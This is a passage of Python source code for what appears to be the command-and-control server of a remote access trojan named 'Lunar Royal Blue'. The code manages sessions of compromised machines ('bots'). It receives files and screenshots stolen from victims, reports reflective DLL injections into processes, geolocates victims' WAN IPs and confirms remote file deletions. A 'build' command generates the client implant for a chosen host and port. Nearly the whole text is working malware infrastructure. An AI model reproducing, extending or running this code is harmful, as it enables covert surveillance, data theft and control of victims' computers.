                        fileinfo = client_data.split(":") 
                        print(fileinfo)
                        filename = fileinfo[1]
                        filesize = int(fileinfo[2])
                        save_file = "downloads/" + filename
                        final_f = uniquify(save_file)
                        with open(final_f, "wb") as incoming_file:
                            data = self.client_socket.recv(4096)

                            print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Downloading file '{fl}' in '{fd}'".format(fl=filename, fd=final_f))
                            while len(data) != filesize:
                                data += self.client_socket.recv(filesize - len(data))  
                                print("data = " + str(len(data)) + " filesize = " + str(filesize))
                                if not data:
                                    break
                            incoming_file.write(data)
                        print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Downloaded '{fl}' => '{fd}'".format(fl=filename, fd=final_f))

                    except Exception as e:
                        print(Fore.RED + Style.BRIGHT + "[X] Error : " + str(e))
                        print(Fore.LIGHTWHITE_EX + "[i] File Download Information : " + client_data)
                        print(Fore.LIGHTYELLOW_EX + "[i] Please report this bug to developer with the information above.")
                        pass
                
                elif client_data.startswith("PROCESS"):
                    try:
                        fileinfo = client_data.split(",")
                        print(
                            Style.BRIGHT + "[" + Fore.GREEN + "+" + Style.RESET_ALL + Style.BRIGHT + "] Process '{p}' running at PID '{pid}' Path on disk '{pth}' ..."
                            .format(p=fileinfo[1], pid=fileinfo[2], pth=fileinfo[3]))

                    except Exception as Error:
                        print(Fore.RED + Style.BRIGHT + "[X] Error : " + str(Error))
                        print(Fore.LIGHTWHITE_EX + "[i] Process Information : " + client_data)
                        print(Fore.LIGHTYELLOW_EX + "[i] Please report this bug to developer with the information above.")
                        pass
                
                elif client_data.startswith("LUNARPID"):
                    try:
                        fileinfo = client_data.split(":")
                        self.send_data("psinfo:"+fileinfo[1])

                    except Exception as Error:
                        print(Fore.RED + Style.BRIGHT + "[X] Error : " + str(Error))
                        print(Fore.LIGHTWHITE_EX + "[i] Process Information : " + client_data)
                        print(Fore.LIGHTYELLOW_EX + "[i] Please report this bug to developer with the information above.")
                        pass
                elif client_data.startswith("ADMIN"):
                    try:
                        fileinfo = client_data.split(":") 
                        
                        if fileinfo[1] == "TRUE":
                            elevated = True
                        else:
                            elevated = False
                            
                        if not silent:
                            print(
                                Style.BRIGHT + "[" + Fore.GREEN + "+" + Style.RESET_ALL + Style.BRIGHT + "] Administrator : " + fileinfo[1].lower())
                    except Exception as Error:
                        print(Fore.RED + Style.BRIGHT + "[X] Error : " + str(Error))
                        print(Fore.LIGHTWHITE_EX + "[i] Process Information : " + client_data)
                        print(Fore.LIGHTYELLOW_EX + "[i] Please report this bug to developer with the information above.")
                        pass

                elif client_data.startswith("SCREENSHOT"):
                    try:
                        fileinfo = client_data.split(":")
                        print(fileinfo)
                        filename = hostList[indexof].split("/")[1].replace(" ", "") + "-" + fileinfo[1]
                        filesize = int(fileinfo[2])
                        save_file = "downloads/" + filename
                        final_f = uniquify(save_file).replace("bmp", "png")
                        with open(final_f, "wb") as incoming_file:
                            data = self.client_socket.recv(4096)
                            print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Downloading file '{fl}' in '{fd}'".format(fl=filename, fd=final_f))
                            while len(data) != filesize:
                                data += self.client_socket.recv(filesize - len(data))  
                                print("data = " + str(len(data)) + " filesize = " + str(filesize))
                                if not data:
                                    break
                            incoming_file.write(data)
                            print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Screenshot saved to '{fl}'".format(fl=final_f))
                            save_and_show_image(final_f) 
                                  
                    except Exception as e:
                        print(Fore.RED + Style.BRIGHT + "[X] Error : " + str(e))
                        print(Fore.LIGHTWHITE_EX + "[i] Screenshot Download Information : " + client_data)
                        print(Fore.LIGHTYELLOW_EX + "[i] Please report this bug to developer with the information above.")
                        pass
                
                elif client_data.startswith("F_OK"):
                    try:
                        fileinfo = client_data.split(",")
                        print(
                            Style.BRIGHT + "[" + Fore.GREEN + "+" + Style.RESET_ALL + Style.BRIGHT + "] Uploaded {filename} ({filesize} bytes) to '{remote_path}' ..."
                            .format(filename=fileinfo[1], filesize=fileinfo[2], remote_path=fileinfo[3]))

                    except Exception as Error:
                        print(Fore.RED + Style.BRIGHT + "[X] Error : " + str(Error))
                        print(Fore.LIGHTWHITE_EX + "[i] File Received Information : " + client_data)
                        print(Fore.LIGHTYELLOW_EX + "[i] Please report this bug to developer with the information above.")
                        pass

                elif client_data.startswith("DLL_OK"):
                    try:
                        fileinfo = client_data.split(":")
                        print(Style.BRIGHT + "[" + Fore.GREEN + "+" + Style.RESET_ALL + Style.BRIGHT + "] Injected Reflective DLL into PID " + fileinfo[1] + " ...")

                    except Exception as Error:
                        print(Fore.RED + Style.BRIGHT + "[X] Error : " + str(Error))
                        print(Fore.LIGHTWHITE_EX + "[i] Reflective DLL Inject Information : " + client_data)
                        print(Fore.LIGHTYELLOW_EX + "[i] Please report this bug to developer with the information above.")
                        pass

                elif client_data.startswith("WANIP"):
                    try:
                        fileinfo = client_data.split(":")
                        print(Style.BRIGHT + "[" + Fore.GREEN + "+" + Style.RESET_ALL + Style.BRIGHT + "] WAN IP : " + fileinfo[1] + " ...")
                        geo_locate(fileinfo[1])
                    except Exception as Error:
                        print(Fore.RED + Style.BRIGHT + "[X] Error : " + str(Error))
                        print(Fore.LIGHTWHITE_EX + "[i] Geolocation Information : " + client_data)
                        print(Fore.LIGHTYELLOW_EX + "[i] Please report this bug to developer with the information above.")
                        pass
                    
                elif client_data.startswith("DEL_OK"):
                    try:
                        fileinfo = client_data.split(",")
                        print("[" + Fore.LIGHTGREEN_EX + Style.BRIGHT + "i" + Style.RESET_ALL + "] File '{file}' deleted from '{pth}' ..." .format(file=fileinfo[1], pth=fileinfo[2]))

                    except Exception as Error:
                        print(Fore.RED + Style.BRIGHT + "[X] Error : " + str(Error))
                        print(Fore.LIGHTWHITE_EX + "[i] File Delete Information : " + client_data)
                        print(Fore.LIGHTYELLOW_EX + "[i] Please report this bug to developer with the information above.")
                        pass
                    
                elif shell_mode is True:
                    print("\n"+client_data)

                elif silent is False:
                    print("\n[" + Style.BRIGHT + Fore.GREEN + "+" + Style.RESET_ALL + "] {ips} : ".format(ips=ips) + client_data)

            except ConnectionAbortedError as cAe:
                self._clear_kick()
                print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] Error Occurred : " + str(cAe))
                print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Online : " + str(len(clients)))
                break
            except ConnectionRefusedError as cRe:
                self._clear_kick()
                print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] Error Occurred : " + str(cRe))
                print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Online : " + str(len(clients)))
                break
            except ConnectionResetError as cRetwo:
                self._clear_kick()
                print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] Error Occurred : " + str(cRetwo))
                print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Online : " + str(len(clients)))
                break
            except ConnectionError as cE:
                self._clear_kick()
                print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] Error Occurred : " + str(cE))
                print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Online : " + str(len(clients)))
                break
            except socket.error as se:

                self._clear_kick()
                print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] Error Occurred : " + str(se))
                print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Online : " + str(len(clients)))
                break
            except Exception as e:
                self._clear_kick()
                print("[X] Error : " + str(e))
                break
            except UnicodeDecodeError as ude:
                print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] Unicode Decode error : " + str(ude))
            except UnicodeEncodeError as eEe:
                print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] Unicode Encode error : " + str(eEe))

            except Exception as recv_error:
                self._clear_kick()
                print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] Error Occurred : " + str(recv_error))
                print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Online : " + str(len(clients)))
                break


def setting(key):
    config = configparser.ConfigParser()
    config.read('settings.ini')
    return config['DEFAULT'][key]


def tcp_server():
    global ip_list
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    server.setsockopt(socket.SOL_TCP, socket.TCP_KEEPIDLE, 1)
    server.setsockopt(socket.SOL_TCP, socket.TCP_KEEPINTVL, 1)
    server.setsockopt(socket.SOL_TCP, socket.TCP_KEEPCNT, 5)
    host = setting('host')
    port = int(setting('port'))
    try:
        server.bind((host, port))
    except PermissionError:
        print(Fore.RED + Style.BRIGHT + "[X] No Permission to bind.")
        exit(True)
    except Exception as i:
        raise i

    try:
        server.listen(1)
    except Exception as S:
        raise S

    print(Style.RESET_ALL + "[" + Fore.LIGHTMAGENTA_EX + "!" + Fore.WHITE + "]" + Fore.BLUE + " Lunar Royal Blue Server is running @ " + Fore.GREEN + host, port)
    while True:
        client, addr = server.accept()
        client.send("lunar_host".encode())
        try:
            host = client.recv(1024).decode()
            if "/" not in host:
                print(Style.BRIGHT + Fore.YELLOW + "[ WARNING ] " + Style.RESET_ALL + "Client has sent an invalid User PC. This *may* not be Lunar!")
        except Exception as e:
            print(str(e))
            break
        cld = ClientManage(client)
        clients.append(client)
        client_ip = str(addr[0]) + ":" + str(addr[1])
        ip_list.append(client_ip)
        hostList.append(host)
        print(Style.BRIGHT + Fore.GREEN + "\n[Session Opened] " + Style.RESET_ALL + cld.return_client_info())
        _thread.start_new_thread(cld.client_thread, ())
        notify("New Session Opened", "A New session has opened to : " + client_ip + " on Host " + host)


def Console():
    global ip_list

    def send_data(csocket, data):
        csocket = int(csocket)
        sockfd = clients[csocket]
        try:
            sockfd.send(data.encode())
        except Exception as error:
            clients.remove(sockfd)
            print(Fore.RED + Style.BRIGHT + "Error Occurred : " + str(error))

    def list_bots():
        print(Fore.MAGENTA + "\n [" + Fore.GREEN + "*" + Fore.MAGENTA + "]" + Fore.WHITE + " Current Sessions (" + Fore.GREEN + str(len(clients)) + Fore.RESET + ")")
        print(Fore.GREEN + "=========================================================================")
        try:
            if len(clients) > 0: 
                for i in range(len(ip_list)):
                    print(Fore.MAGENTA + "\n[SESSION ID : " + str(i) + "]" + Fore.GREEN + "[Connection : " + ip_list[i] + "]" + Fore.YELLOW + "[" + hostList[i] + "]")
        except Exception as stre:
            print(Fore.RED + Style.BRIGHT + "Error : " + str(stre))
    clear_screen()
    print(banner)
    _thread.start_new_thread(tcp_server, ())
    global silent
    while True:
        try:
            if silent is False:
                x = input(Style.RESET_ALL + Fore.BLUE + Style.BRIGHT + "#/master@Lunar:> " + Fore.WHITE + Style.RESET_ALL)
                #x = prompt(promptstr)
                args = x.split()
                if x == "list" or x == "sessions":
                    list_bots()
                elif x.startswith("session"):
                    try:
                        cid = args[1]
                        sock = clients[int(cid)]
                        sess = ClientManage(sock)
                        sess.session()
                    except IndexError:
                        print(Fore.RED + "USAGE : session < client id >")
                elif x.startswith("send"):
                    try:
                        cid = args[1]
                        send_data(cid, args[2])
                    except IndexError:
                        print("USAGE : send <id> <data>")
                elif x == "exit":
                    sys.exit(1)
                elif x == "help":
                    print( 
                    Fore.BLUE + Style.BRIGHT + """
                    Lunar Royal Blue Framework""" + 
                    Fore.WHITE + """
		    ---------------
                    -> Commands : 
                    -. help - Print this help message.
                    -. sessions - View online clients.
                    -. session - interact with a session.
                    -. build - Build Lunar.
                    -. kill - Kill session.
                    -. exit - Exit Lunar.

                    Use the help command inside a session to view Session specific help.
                    """ + Style.RESET_ALL)
                elif x == "build":
                    host = prompt("[+] Host : ")
                    port = prompt("[+] Port : ")
                    if len(host) > 0 and len(port) > 0:
                        Build(host, port)
                        
                elif x.startswith("kill"):
                    try:
                        cid = int(args[1])
                        send_data(cid, "kill")
                        clients[cid].shutdown(socket.SHUT_RDWR)
                        clients[cid].close()
                    except IndexError:
                        print(Fore.RED + "USAGE : kill <session id>")

                else:
                    if len(x) > 0:
                        try:
                            print(Style.BRIGHT + Fore.LIGHTCYAN_EX)
                            subprocess.run(['bash', '-c', x])
                            print(Style.RESET_ALL)
                        except Exception as procError:
                            print("["+Style.BRIGHT + Fore.LIGHTBLUE_EX + "*" + Style.RESET_ALL + "] Error : " + str(procError))
                            
        except KeyboardInterrupt:
            print(Fore.RED + " [X] Lunar was Interrupted! Type " + Style.BRIGHT + "exit" + Style.RESET_ALL + Fore.RED + " to Exit.")
